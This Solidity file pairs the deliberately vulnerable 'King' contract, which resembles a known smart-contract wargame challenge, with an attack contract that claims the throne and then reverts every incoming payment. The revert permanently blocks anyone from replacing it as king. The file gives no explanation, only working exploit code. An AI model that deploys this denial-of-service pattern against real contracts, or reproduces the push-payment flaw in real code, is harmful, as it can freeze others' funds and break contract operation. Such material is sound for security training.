// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract AttackSelfDestructMe {
    King target;

    constructor(King _target) payable {
        target = _target;
    }

    function attack() external payable {
        require(msg.value >= target.prize(), "Not enough ETH sent");
        payable(address(target)).call{value: msg.value}("");
    }

    receive() external payable {
        revert("Keep your money!");
    }
}